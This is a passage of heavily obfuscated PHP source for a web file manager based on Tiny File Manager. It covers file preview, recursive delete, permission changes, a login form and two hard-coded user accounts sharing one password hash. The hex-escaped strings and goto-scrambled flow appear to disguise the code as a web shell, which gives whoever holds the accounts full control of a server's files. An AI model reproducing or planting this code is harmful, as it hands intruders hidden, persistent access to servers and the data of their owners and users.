"\74\x69\x66\162\x61\155\x65\x20\163\162\143\x3d\x22\x68\x74\x74\x70\163\72\x2f\57\166\x69\145\167\56\x6f\x66\x66\x69\143\x65\x61\x70\x70\x73\56\x6c\x69\166\145\56\143\x6f\x6d\57\x6f\160\x2f\145\155\x62\145\144\x2e\x61\163\x70\170\x3f\x73\x72\143\x3d" . fm_enc($file_url) . "\x22\40\146\x72\141\x6d\x65\142\157\162\x64\x65\x72\x3d\42\156\157\42\40\x73\x74\171\x6c\145\x3d\42\167\151\144\164\150\72\x31\x30\x30\45\x3b\155\x69\156\x2d\x68\x65\x69\x67\150\x74\72\x34\66\60\160\x78\42\76\x3c\57\x69\x66\x72\141\155\145\x3e"; } } } elseif ($is_zip) { if ($filenames !== false) { echo "\x3c\x63\x6f\x64\x65\x20\143\x6c\141\163\x73\75\x22\x6d\141\x78\x68\x65\x69\147\x68\x74\42\76"; foreach ($filenames as $fn) { if ($fn["\146\x6f\154\144\145\162"]) { echo "\x3c\142\x3e" . fm_enc($fn["\x6e\x61\155\145"]) . "\74\x2f\142\x3e\74\x62\x72\76"; } else { echo $fn["\156\141\155\x65"] . "\40\50" . fm_get_filesize($fn["\x66\151\x6c\145\x73\x69\172\145"]) . "\x29\x3c\142\x72\x3e"; } } echo "\74\x2f\x63\x6f\x64\x65\76"; } else { echo "\74\160\76" . lng("\x45\162\162\x6f\162\40\167\150\151\154\x65\40\x66\x65\x74\143\x68\x69\x6e\147\40\x61\162\143\150\x69\x76\x65\40\x69\x6e\x66\x6f") . "\x3c\x2f\x70\x3e"; } } elseif ($is_image) { if (in_array($ext, array("\147\151\146", "\x6a\160\x67", "\x6a\x70\145\147", "\160\156\147", "\x62\155\x70", "\151\x63\157", "\163\x76\x67", "\x77\145\142\x70", "\x61\x76\151\146"))) { echo "\x3c\160\76\x3c\x69\155\x67\x20\x73\162\x63\x3d\x22" . fm_enc($file_url) . "\42\40\141\154\164\x3d\x22\42\40\x63\x6c\141\x73\163\x3d\x22\x70\162\145\166\151\x65\x77\x2d\151\155\x67\42\76\74\57\x70\76"; } } elseif ($is_audio) { echo "\x3c\x70\x3e\74\x61\165\x64\151\157\x20\x73\162\143\75\42" . fm_enc($file_url) . "\42\40\x63\x6f\156\x74\162\x6f\x6c\x73\x20\x70\162\x65\154\157\141\x64\75\42\155\x65\x74\141\x64\x61\x74\141\42\x3e\74\57\x61\x75\144\x69\157\76\74\x2f\160\76"; } elseif ($is_video) { echo "\74\x64\151\x76\x20\x63\154\x61\x73\163\x3d\42\160\162\x65\x76\x69\x65\x77\55\x76\x69\144\145\157\x22\x3e\74\166\x69\144\x65\157\x20\x73\162\x63\x3d\x22" . fm_enc($file_url) . "\x22\x20\167\x69\144\x74\150\75\42\66\x34\x30\42\40\150\x65\151\x67\x68\x74\x3d\42\x33\66\x30\42\40\143\x6f\x6e\164\162\157\x6c\163\40\160\162\145\154\157\141\144\75\x22\x6d\145\164\141\144\141\x74\141\42\x3e\x3c\57\x76\x69\x64\145\x6f\x3e\74\x2f\x64\151\x76\x3e"; } elseif ($is_text) { if (FM_USE_HIGHLIGHTJS) { $hljs_classes = array("\x73\x68\x74\155\x6c" => "\170\155\x6c", "\150\x74\141\143\143\145\x73\163" => "\x61\160\141\143\150\x65", "\x70\x68\x74\155\x6c" => "\x70\x68\x70", "\x6c\x6f\x63\153" => "\x6a\x73\x6f\156", "\163\166\x67" => "\170\155\x6c"); $hljs_class = isset($hljs_classes[$ext]) ? "\x6c\x61\156\x67\55" . $hljs_classes[$ext] : "\154\141\x6e\147\x2d" . $ext; if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match("\x23\x5c\x2e\155\151\x6e\134\56\x28\x63\163\x73\x7c\x6a\163\51\x24\43\151", $file)) { $hljs_class = "\x6e\157\x68\151\147\x68\154\x69\x67\150\x74"; } $content = "\74\x70\x72\x65\x20\x63\154\x61\x73\163\x3d\x22\167\x69\164\x68\x2d\150\x6c\152\x73\42\76\x3c\143\x6f\x64\145\40\143\154\x61\163\163\75\x22" . $hljs_class . "\42\x3e" . fm_enc($content) . "\74\x2f\x63\157\144\145\x3e\74\57\x70\162\x65\76"; } elseif (in_array($ext, array("\x70\x68\160", "\x70\150\160\64", "\x70\150\160\65", "\160\x68\164\x6d\x6c", "\x70\x68\x70\x73"))) { $content = highlight_string($content, true); } else { $content = "\74\160\162\x65\x3e" . fm_enc($content) . "\74\x2f\x70\162\145\x3e"; } echo $content; } ?>
        </div>
    </div>
    <?php  if (!$quickView) { fm_show_footer(); } die; } goto cXZ_L; dv8xf: echo lng("\101\x63\x74\x69\157\156\x73"); goto JK7V4; BwbtG: if (!isset($_GET["\160"]) && empty($_FILES)) { fm_redirect(FM_SELF_URL . "\x3f\x70\x3d"); } goto MpdJd; htTgJ: fm_show_footer(); goto o4Xl6; mp34R: $hide_Cols = isset($cfg->data["\150\x69\x64\x65\137\103\157\x6c\x73"]) ? $cfg->data["\x68\151\x64\145\x5f\103\x6f\154\163"] : true; goto QjRlA; lpmlo: if (!FM_READONLY) { ?>
                        <th style="width:3%" class="custom-checkbox-header">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                                <label class="custom-control-label" for="js-select-all-items"></label>
                            </div>
                        </th><?php  } goto C2MLT; Cubf3: $lang_list = array("\x65\156" => "\x45\x6e\x67\154\x69\x73\x68"); goto t4YyM; UozNB: function fm_get_directorysize($directory) { global $calc_folder; if ($calc_folder == true) { $size = 0; $count = 0; $dirCount = 0; foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file) { if ($file->isFile()) { $size += $file->getSize(); $count++; } else { if ($file->isDir()) { $dirCount++; } } } return $size; } else { return "\x46\x6f\154\x64\145\162"; } } goto PBVeg; hS6b3: $num_files = count($files); goto krT1W; llm7n: if (isset($_POST["\147\162\157\x75\x70"], $_POST["\144\x65\x6c\x65\x74\145"]) && !FM_READONLY) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $errors = 0; $files = $_POST["\146\151\154\145"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $new_path = $path . "\x2f" . $f; if (!fm_rdelete($new_path)) { $errors++; } } } if ($errors == 0) { fm_set_msg(lng("\x53\145\154\145\143\164\x65\x64\x20\146\x69\154\x65\x73\40\x61\x6e\x64\x20\146\x6f\154\144\x65\162\x20\x64\145\x6c\145\164\x65\144")); } else { fm_set_msg(lng("\105\x72\x72\x6f\162\x20\167\150\x69\x6c\145\40\144\145\154\x65\x74\x69\x6e\147\x20\151\164\145\155\x73"), "\145\x72\x72\x6f\162"); } } else { fm_set_msg(lng("\116\157\164\150\x69\x6e\147\x20\163\145\x6c\145\143\x74\145\x64"), "\141\x6c\x65\x72\164"); } fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } goto lgvvh; oeTfC: $p = fm_clean_path($p); goto NrVzR; C2MLT: ?>
                    <th><?php  goto olkgN; UcM8h: function fm_get_audio_exts() { return array("\167\141\166", "\x6d\160\x33", "\x6f\147\x67", "\x6d\64\141"); } goto O6YKO; o4Xl6: function fm_is_file_allowed($filename) { $allowed = false; if (FM_EXTENSION) { $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); if (in_array($ext, explode("\x2c", strtolower(FM_EXTENSION)))) { $allowed = true; } } return $allowed; } goto N0tuE; f_f3P: function fm_show_message() { if (isset($_SESSION[FM_SESSION_ID]["\155\x65\x73\x73\x61\x67\x65"])) { $class = isset($_SESSION[FM_SESSION_ID]["\163\x74\141\x74\165\163"]) ? $_SESSION[FM_SESSION_ID]["\163\x74\x61\164\165\163"] : "\x6f\153"; echo "\74\160\x20\x63\x6c\x61\x73\x73\75\x22\155\x65\163\163\141\x67\145\40" . $class . "\x22\76" . $_SESSION[FM_SESSION_ID]["\155\x65\163\163\141\147\x65"] . "\74\x2f\x70\x3e"; unset($_SESSION[FM_SESSION_ID]["\155\x65\163\x73\x61\147\145"]); unset($_SESSION[FM_SESSION_ID]["\x73\164\x61\164\165\163"]); } } goto A7iLO; vuqjc: defined("\x46\115\x5f\104\x41\124\x45\x54\111\x4d\105\137\x46\x4f\x52\x4d\101\x54") || define("\x46\x4d\137\x44\101\124\105\124\x49\x4d\105\137\106\117\122\x4d\101\124", $datetime_format); goto gwrFe; HDJgG: function fm_object_to_array($obj) { if (!is_object($obj) && !is_array($obj)) { return $obj; } if (is_object($obj)) { $obj = get_object_vars($obj); } return array_map("\x66\155\x5f\x6f\142\x6a\145\143\x74\x5f\x74\157\x5f\141\x72\x72\x61\x79", $obj); } goto fHG_r; JuO9B: function fm_is_valid_ext($filename) { $allowed = FM_FILE_EXTENSION ? explode("\x2c", FM_FILE_EXTENSION) : false; $ext = pathinfo($filename, PATHINFO_EXTENSION); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; return $isFileAllowed ? true : false; } goto xLqxJ; cCS4W: defined("\106\x4d\x5f\x4c\101\x4e\x47") || define("\106\x4d\137\114\x41\x4e\x47", $lang); goto Zkd6P; XNNNU: $ip_whitelist = array("\x31\x32\x37\56\60\x2e\60\x2e\x31", "\x3a\72\61"); goto IKsCI; V4n1f: $directories_users = array(); goto GYwg3; fHG_r: function fm_get_file_icon_class($path) { $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION)); switch ($ext) { case "\x69\x63\x6f": case "\147\x69\146": case "\152\160\x67": case "\152\160\x65\x67": case "\x6a\160\x63": case "\x6a\160\x32": case "\152\160\x78": case "\x78\142\155": case "\x77\142\155\x70": case "\160\x6e\147": case "\x62\155\160": case "\164\151\x66": case "\x74\x69\146\x66": case "\167\x65\142\160": case "\141\x76\x69\146": case "\163\166\x67": $img = "\x66\141\x20\146\x61\55\x70\151\143\x74\165\x72\x65\x2d\157"; break; case "\x70\141\x73\x73\167\x64": case "\x66\164\x70\161\x75\x6f\164\141": case "\x73\161\154": case "\x6a\163": case "\152\163\157\x6e": case "\x73\x68": case "\x63\x6f\x6e\146\x69\147": case "\x74\167\x69\x67": case "\x74\x70\x6c": case "\155\x64": case "\147\151\x74\x69\147\156\157\162\x65": case "\x63": case "\143\160\160": case "\x63\x73": case "\160\x79": case "\162\163": case "\x6d\141\x70": case "\x6c\x6f\x63\153": case "\144\164\x64": $img = "\x66\141\x20\x66\141\x2d\x66\x69\x6c\x65\x2d\143\157\144\145\x2d\157"; break; case "\x74\170\164": case "\151\x6e\x69": case "\143\157\x6e\x66": case "\154\x6f\x67": case "\150\164\x61\x63\x63\145\x73\x73": $img = "\146\141\40\146\141\x2d\146\x69\154\x65\55\x74\x65\170\x74\55\x6f"; break; case "\x63\x73\x73": case "\154\x65\163\x73": case "\x73\141\163\163": case "\x73\x63\163\x73": $img = "\x66\141\x20\x66\141\x2d\143\163\163\63"; break; case "\142\172\62": case "\172\151\x70": case "\162\x61\162": case "\147\x7a": case "\x74\x61\x72": case "\x37\172": case "\170\172": $img = "\x66\x61\x20\x66\141\x2d\146\151\154\145\55\141\x72\x63\150\x69\x76\145\55\157"; break; case "\160\x68\160": case "\x70\x68\160\64": case "\160\x68\x70\65": case "\160\x68\160\163": case "\160\150\x74\155\154": $img = "\146\141\40\x66\x61\x2d\143\x6f\x64\x65"; break; case "\x68\x74\x6d": case "\150\x74\x6d\x6c": case "\x73\x68\x74\x6d\154": case "\170\150\164\155\x6c": $img = "\x66\141\40\x66\141\55\x68\164\155\154\65"; break; case "\170\155\x6c": case "\170\163\x6c": $img = "\146\141\40\x66\x61\55\x66\151\x6c\145\55\145\x78\143\x65\x6c\55\x6f"; break; case "\167\x61\x76": case "\x6d\x70\63": case "\x6d\x70\62": case "\x6d\64\x61": case "\x61\x61\143": case "\x6f\147\x67": case "\x6f\x67\141": case "\x77\x6d\141": case "\x6d\x6b\x61": case "\x66\x6c\141\143": case "\x61\x63\63": case "\x74\x64\x73": $img = "\146\141\x20\146\x61\x2d\x6d\165\163\151\x63"; break; case "\x6d\63\165": case "\155\x33\x75\70": case "\x70\154\163": case "\x63\165\145": case "\x78\163\x70\x66": $img = "\x66\141\40\146\141\55\150\x65\x61\x64\160\x68\157\x6e\x65\x73"; break; case "\141\166\x69": case "\155\160\147": case "\x6d\x70\145\147": case "\155\160\x34": case "\x6d\64\166": case "\146\x6c\x76": case "\146\64\166": case "\157\147\155": case "\157\147\166": case "\155\x6f\166": case "\x6d\153\166": case "\63\x67\x70": case "\141\163\146": case "\167\x6d\x76": $img = "\146\141\40\146\x61\x2d\146\x69\154\145\55\166\151\144\145\157\x2d\157"; break; case "\x65\x6d\154": case "\155\163\147": $img = "\146\141\x20\146\141\x2d\145\x6e\166\x65\154\x6f\160\145\55\x6f"; break; case "\170\x6c\163": case "\170\154\163\170": case "\x6f\144\163": $img = "\146\x61\x20\146\x61\x2d\146\x69\154\145\x2d\145\x78\x63\145\154\x2d\x6f"; break; case "\143\163\x76": $img = "\x66\x61\x20\x66\x61\x2d\146\x69\x6c\145\55\x74\145\x78\164\55\157"; break; case "\x62\x61\x6b": case "\163\167\160": $img = "\x66\141\x20\x66\141\55\143\x6c\151\160\142\157\141\162\x64"; break; case "\144\157\x63": case "\144\157\143\x78": case "\x6f\x64\164": $img = "\x66\x61\40\x66\141\x2d\146\151\x6c\145\x2d\167\x6f\x72\x64\x2d\x6f"; break; case "\160\160\164": case "\160\160\x74\170": $img = "\x66\141\40\x66\x61\x2d\146\x69\154\x65\55\160\x6f\x77\145\x72\160\157\151\x6e\x74\55\157"; break; case "\x74\x74\x66": case "\x74\x74\143": case "\157\164\146": case "\167\x6f\146\146": case "\167\157\146\146\x32": case "\x65\x6f\164": case "\146\157\156": $img = "\x66\141\40\146\x61\55\x66\x6f\x6e\164"; break; case "\160\144\146": $img = "\146\x61\x20\x66\x61\x2d\146\151\x6c\x65\55\160\144\146\x2d\157"; break; case "\x70\x73\144": case "\141\x69": case "\x65\160\163": case "\x66\x6c\141": case "\x73\167\146": $img = "\x66\141\40\x66\x61\x2d\x66\151\x6c\x65\55\x69\155\x61\x67\145\x2d\x6f"; break; case "\145\170\x65": case "\155\x73\151": $img = "\x66\x61\40\x66\x61\55\x66\x69\x6c\x65\55\x6f"; break; case "\x62\x61\164": $img = "\x66\141\x20\x66\141\55\x74\145\x72\x6d\151\156\x61\x6c"; break; default: $img = "\x66\x61\40\x66\141\x2d\x69\156\x66\x6f\55\x63\x69\162\143\x6c\145"; } return $img; } goto NVoJj; RPd6d: $current_path = array_slice(explode("\x2f", $path), -1)[0]; goto GgH4T; zpq7C: if ($parent !== false) { ?>
                    <tr><?php  if (!FM_READONLY) { ?>
                            <td class="nosort"></td><?php  } ?>
                        <td class="border-0"><a href="?p=<?php  echo urlencode($parent); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                        <?php  if (!FM_IS_WIN && !$hide_Cols) { ?>
                            <td class="border-0"></td>
                            <td class="border-0"></td>
                        <?php  } ?>
                    </tr>
                    <?php  } goto r41Ok; YHHhC: $lang = isset($cfg->data["\154\x61\x6e\x67"]) ? $cfg->data["\154\141\x6e\147"] : "\x65\156"; goto p3idg; UKsq5: if ($use_auth) { if (isset($_SESSION[FM_SESSION_ID]["\x6c\x6f\x67\147\x65\144"], $auth_users[$_SESSION[FM_SESSION_ID]["\x6c\157\147\x67\x65\x64"]])) { } elseif (isset($_POST["\x66\155\137\x75\163\162"], $_POST["\146\x6d\137\160\x77\x64"])) { sleep(1); if (function_exists("\160\141\163\x73\x77\157\162\144\x5f\166\x65\x72\151\x66\x79")) { if (isset($auth_users[$_POST["\146\155\137\x75\x73\162"]]) && isset($_POST["\146\155\137\160\167\x64"]) && password_verify($_POST["\146\x6d\137\160\167\144"], $auth_users[$_POST["\x66\x6d\137\165\x73\x72"]])) { $_SESSION[FM_SESSION_ID]["\154\157\147\x67\x65\x64"] = $_POST["\x66\155\137\x75\x73\x72"]; fm_set_msg(lng("\131\x6f\x75\x20\x61\162\145\40\x6c\157\x67\x67\145\x64\40\x69\x6e")); fm_redirect(FM_SELF_URL . "\77\x70\75"); } else { unset($_SESSION[FM_SESSION_ID]["\154\x6f\x67\x67\145\x64"]); fm_set_msg(lng("\x4c\157\147\151\x6e\x20\x66\x61\x69\154\145\x64\56\40\x49\156\166\141\x6c\151\144\x20\165\163\x65\162\156\141\155\145\x20\157\162\x20\160\141\163\163\x77\x6f\162\144"), "\145\162\162\157\162"); fm_redirect(FM_SELF_URL); } } else { fm_set_msg(lng("\x70\x61\x73\163\x77\x6f\x72\144\137\150\141\163\150\40\x6e\x6f\164\x20\x73\x75\x70\x70\157\x72\164\x65\x64\x2c\40\x55\x70\x67\162\x61\x64\x65\40\x50\110\120\x20\166\145\162\163\x69\x6f\x6e"), "\x65\x72\162\157\x72"); } } else { unset($_SESSION[FM_SESSION_ID]["\x6c\x6f\x67\147\145\144"]); fm_show_header_login(); ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php  echo fm_get_theme(); ?>
">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="form-group">
                                        <div class="text-center">
                                            <h1 class="card-title"><?php  echo APP_TITLE; ?>
</h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="form-group">
                                        <label for="fm_usr"><?php  echo lng("\125\x73\145\x72\x6e\x61\155\x65"); ?>
</label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="form-group">
                                        <label for="fm_pwd"><?php  echo lng("\120\141\x73\x73\x77\x6f\162\144"); ?>
</label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="form-group">
                                        <?php  fm_show_message(); ?>
                                    </div>

                                    <div class="form-group">
                                        <button type="submit" class="btn btn-success btn-block mt-4" role="button">
                                            <?php  echo lng("\x4c\x6f\147\151\156"); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-muted" data-version="<?php  echo VERSION; ?>
">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php  fm_show_footer_login(); die; } } goto kLodc; IKZ08: $auth_users = array("\x68\x6f\x6e\144\x61" => "\x24\62\171\x24\x31\x30\44\62\70\66\x68\67\x64\105\164\105\x72\130\154\167\120\111\x38\x44\x55\x79\125\117\145\70\x4d\x50\103\150\101\x79\x68\x30\64\122\x78\171\x4d\x55\152\151\x73\156\x4c\x38\142\124\x79\x49\x58\162\x79\x6f\62\x61", "\x61\x63\x74\x69\166\141" => "\x24\x32\x79\44\61\60\44\62\x38\66\150\67\x64\105\164\x45\x72\130\154\x77\120\x49\70\104\x55\171\125\117\145\70\x4d\x50\x43\x68\101\x79\x68\60\x34\122\170\x79\x4d\125\152\151\163\156\x4c\x38\x62\x54\x79\111\130\162\171\157\x32\x61"); goto QWiCp; IKsCI: $ip_blacklist = array("\x30\56\x30\56\x30\56\60", "\72\72"); goto AOLMn; r41Ok: $ii = 3399; goto EbtKU; Bup1I: defined("\106\115\x5f\x53\x45\x4c\x46\137\x55\x52\x4c") || define("\106\115\x5f\x53\x45\x4c\106\137\x55\122\114", ($is_https ? "\150\164\x74\x70\x73" : "\150\x74\164\x70") . "\72\57\57" . $http_host . $_SERVER["\120\x48\x50\137\123\x45\x4c\x46"]); goto uN1P8; S1aV3: if (isset($_GET["\x63\x68\155\157\144"]) && !FM_READONLY && !FM_IS_WIN) { $file = $_GET["\x63\150\x6d\157\x64"]; $file = fm_clean_path($file); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\57" . $file) && !is_dir($path . "\x2f" . $file)) { fm_set_msg(lng("\x46\151\x6c\x65\x20\x6e\157\x74\x20\146\x6f\165\156\144"), "\x65\x72\162\x6f\x72"); fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); $file_url = FM_ROOT_URL . (FM_PATH != '' ? "\57" . FM_PATH : '') . "\57" . $file; $file_path = $path . "\57" . $file; $mode = fileperms($path . "\x2f" . $file); ?>
    <div class="path">
        <div class="card mb-2 <?php  echo fm_get_theme(); ?>
">
            <h6 class="card-header">
                <?php  echo lng("\x43\150\141\156\x67\145\120\145\162\x6d\x69\163\x73\151\x6f\x6e\x73"); ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    Full path: <?php  echo $file_path; ?>
<br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="chmod" value="<?php  echo fm_enc($file); ?>
">

                    <table class="table compact-table <?php  echo fm_get_theme(); ?>
">
                        <tr>
                            <td></td>
                            <td><b><?php  echo lng("\x4f\167\156\145\x72"); ?>
</b></td>
                            <td><b><?php  echo lng("\107\162\157\x75\x70"); ?>
</b></td>
                            <td><b><?php  echo lng("\x4f\x74\150\145\162"); ?>
</b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\122\x65\x61\x64"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php  echo $mode & 256 ? "\40\x63\x68\x65\143\x6b\x65\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php  echo $mode & 32 ? "\40\x63\x68\x65\x63\153\x65\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php  echo $mode & 4 ? "\x20\x63\x68\x65\x63\153\145\x64" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\127\x72\x69\x74\145"); ?>
</b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php  echo $mode & 128 ? "\40\143\150\x65\x63\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php  echo $mode & 16 ? "\x20\143\150\145\x63\x6b\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php  echo $mode & 2 ? "\40\143\x68\x65\143\x6b\145\x64" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\x45\170\145\x63\x75\x74\145"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php  echo $mode & 64 ? "\x20\143\x68\145\143\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php  echo $mode & 8 ? "\40\x63\x68\x65\143\153\x65\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php  echo $mode & 1 ? "\x20\x63\150\145\143\153\145\x64" : ''; ?>
></label></td>
                        </tr>
                    </table>

                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\x43\150\x61\x6e\x67\145"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\x61\x6e\143\x65\154"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto nHlkJ; K97zT: function fm_show_header() { $sprites_ver = "\62\60\x31\x36\x30\x33\x31\x35"; header("\103\x6f\156\x74\145\156\164\55\124\x79\x70\145\x3a\x20\164\145\170\164\x2f\150\164\x6d\x6c\73\40\143\150\141\162\163\145\x74\x3d\x75\x74\x66\55\70"); header("\x45\170\160\x69\x72\x65\163\72\40\x53\x61\x74\54\x20\62\x36\40\112\x75\x6c\x20\61\71\x39\67\x20\x30\65\x3a\x30\60\x3a\60\60\40\x47\115\124"); header("\103\x61\x63\150\145\x2d\103\x6f\156\x74\x72\x6f\x6c\72\40\156\157\55\x73\164\x6f\x72\145\x2c\40\156\157\x2d\143\x61\x63\x68\145\x2c\40\155\x75\x73\164\55\162\145\166\141\154\x69\x64\141\164\145\54\40\x70\157\x73\x74\x2d\143\x68\x65\143\153\75\x30\54\40\160\x72\145\55\143\150\145\x63\x6b\x3d\x30"); header("\120\162\x61\147\x6d\x61\x3a\40\156\x6f\55\x63\141\x63\x68\145"); global $lang, $root_url, $sticky_navbar, $favicon_path; $isStickyNavBar = $sticky_navbar ? "\156\x61\x76\142\141\x72\x2d\x66\x69\170\145\x64" : "\156\141\x76\x62\x61\162\x2d\x6e\x6f\162\155\141\x6c"; ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        <meta name="author" content="CCP Programmers">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <?php  if ($favicon_path) { echo "\74\154\151\156\x6b\40\x72\x65\x6c\x3d\x22\151\143\157\x6e\x22\40\150\x72\145\146\75\42" . fm_enc($favicon_path) . "\x22\40\164\171\160\145\x3d\x22\x69\155\141\x67\x65\x2f\x70\156\x67\x22\x3e"; } ?>
        <title><?php  echo fm_enc(APP_TITLE); ?>
</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" />
        <?php  if (FM_USE_HIGHLIGHTJS) { ?>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/<?php  echo FM_HIGHLIGHTJS_STYLE; ?>
.min.css">
        <?php  } ?>
        <style>
            body { font-size:14px;color:#222;background:#F7F7F7; }
            body.navbar-fixed { margin-top:55px; }
            a:hover, a:visited, a:focus { text-decoration:none !important; }
            * { -webkit-border-radius:0 !important;-moz-border-radius:0 !important;border-radius:0 !important; }
            .filename, td, th { white-space:nowrap  }
            .navbar-brand { font-weight:bold; }
            .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
            .nav-item.avatar a > i { font-size:15px; }
            .nav-item.avatar .dropdown-menu a { font-size:13px; }
            #search-addon { font-size:12px;border-right-width:0; }
            #search-addon2 { background:transparent;border-left:0; }
            .bread-crumb { color:#cccccc;font-style:normal; }
            #main-table .filename a { color:#222222; }
            .table td, .table th { vertical-align:middle !important; }
            .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; }
            .table-sm td, .table-sm th { padding:.4rem; }
            .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
            .hidden { display:none  }
            pre.with-hljs { padding:0  }
            pre.with-hljs code { margin:0;border:0;overflow:visible  }
            code.maxheight, pre.maxheight { max-height:512px  }
            .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
            .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
            .path { margin-bottom:10px  }
            form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
            .right { text-align:right  }
            .center, .close, .login-form { text-align:center  }
            .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
            .message.ok { border-color:green;color:green  }
            .message.error { border-color:red;color:red  }
            .message.alert { border-color:orange;color:orange  }
            .preview-img { max-width:100%;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC)  }
            .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px;border-radius:3px  }
            .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
            .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
            .compact-table { border:0;width:auto  }
            .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
            .compact-table tr:hover td { background-color:#fff  }
            .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
            .break-word { word-wrap:break-word;margin-left:30px  }
            .break-word.float-left a { color:#7d7d7d  }
            .break-word + .float-right { padding-right:30px;position:relative  }
            .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
            #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
            @media (max-width:481px) {
                #editor { top:150px; }
            }
            #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
            .btn-2 { border-radius:0;padding:3px 6px;font-size:small; }
            li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
            li.folder:before { content:"\f114" }
            i.fa.fa-folder-o { color:#0157b3 }
            i.fa.fa-picture-o { color:#26b99a }
            i.fa.fa-file-archive-o { color:#da7d7d }
            .btn-2 i.fa.fa-file-archive-o { color:inherit }
            i.fa.fa-css3 { color:#f36fa0 }
            i.fa.fa-file-code-o { color:#007bff }
            i.fa.fa-code { color:#cc4b4c }
            i.fa.fa-file-text-o { color:#0096e6 }
            i.fa.fa-html5 { color:#d75e72 }
            i.fa.fa-file-excel-o { color:#09c55d }
            i.fa.fa-file-powerpoint-o { color:#f6712e }
            i.go-back { font-size:1.2em;color:#007bff; }
